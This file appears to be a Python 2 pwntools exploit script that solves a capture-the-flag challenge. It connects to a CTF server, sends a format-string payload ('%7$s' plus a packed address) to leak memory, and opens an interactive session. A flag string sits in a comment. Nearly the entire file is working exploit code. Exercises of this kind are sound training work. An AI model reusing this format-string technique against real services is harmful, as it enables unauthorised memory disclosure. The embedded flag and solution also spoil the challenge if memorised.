#!/usr/bin/env python2
# -*- coding: ascii -*-
from pwn import *

# FLAG{CRACKCR4CKCRaCK}

context.arch = 'amd64'

host , port = 'csie.ctf.tw' , 10133

y = remote(host,port)

p = '%7$s....' + p64(0x600ba0)

y.sendafter( '?' , p )

y.interactive()

